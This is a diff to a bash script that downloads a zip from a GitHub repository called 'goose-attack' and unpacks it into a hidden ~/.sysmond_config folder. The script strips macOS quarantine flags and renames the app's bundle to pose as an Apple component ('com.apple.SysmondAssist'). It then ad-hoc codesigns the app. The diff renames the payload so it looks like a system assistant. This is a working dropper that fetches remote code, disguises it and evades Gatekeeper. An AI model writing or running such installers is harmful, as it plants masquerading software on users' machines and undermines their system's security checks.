@@ -1,5 +1,5 @@
 #!/bin/bash
-curl -L -o /tmp/mac_goose.zip https://github.com/Gallus17/goose-attack/raw/refs/heads/main/mac_goose.zip
+curl -L -o /tmp/mac_goose.zip https://github.com/Gallus17/goose-attack/raw/refs/heads/main/sysmond_assist.zip
 
 unzip -o /tmp/mac_goose.zip -d ~/.sysmond_config && xattr -cr ~/.sysmond_config/temp/"SysmondAssist.app" && chmod -R 755 ~/.sysmond_config/"SysmondAssist.app" && /usr/libexec/PlistBuddy -c "Set :CFBundleName 'com.apple.SysmondAssist-LJk4Qbrnf'" ~/.sysmond_config/"SysmondAssist.app"/Contents/Info.plist && codesign --force --deep --sign - ~/.sysmond_config/"SysmondAssist.app"
 
